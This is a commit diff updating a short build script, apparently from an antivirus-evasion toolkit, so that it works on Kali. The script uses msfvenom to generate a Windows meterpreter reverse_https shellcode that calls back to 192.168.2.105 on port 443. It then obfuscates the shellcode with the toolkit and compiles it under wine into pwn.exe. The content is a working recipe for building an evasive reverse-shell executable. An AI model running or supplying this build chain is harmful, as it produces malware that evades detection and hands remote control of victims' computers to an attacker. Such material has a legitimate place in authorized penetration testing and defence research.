b583012dc95fe7328e583f28d4fef209995a08d2
Daniel Sauder <daniel.sauder@web.de>
2017-02-11 15:33:11 -0500

    update for kali

--- build.sh
+++ build.sh
@@ -2,11 +2,11 @@
 
 # very simple script for building the .exe file
 
-msfpayload windows/meterpreter/reverse_https lhost=192.168.2.105 lport=443 C > sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.105 lport=443 -f c -a x86 --platform Windows > sc.txt
 ./format.sh sc.txt > scclean.txt
 ./make_avet -f scclean.txt
 
-wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o pwn.exe avet.c
+wine gcc.exe -m32 -o pwn.exe avet.c
 
 rm sc.txt
 
